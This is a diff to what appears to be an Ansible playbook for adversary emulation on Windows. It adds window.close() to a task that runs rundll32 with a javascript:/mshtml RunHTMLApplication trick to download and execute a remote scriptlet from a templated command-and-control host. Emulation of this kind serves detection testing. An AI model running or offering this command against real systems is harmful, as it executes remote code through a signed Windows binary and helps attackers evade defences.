@@ -7,7 +7,7 @@
   - name: Run Rundll32 to download and execute script (create a new file evil.sct)
     tags: always
     win_command: |
-      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_sct }}")
+      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_sct }}");window.close()
   - name: check file exist
     tags: always
     win_stat:
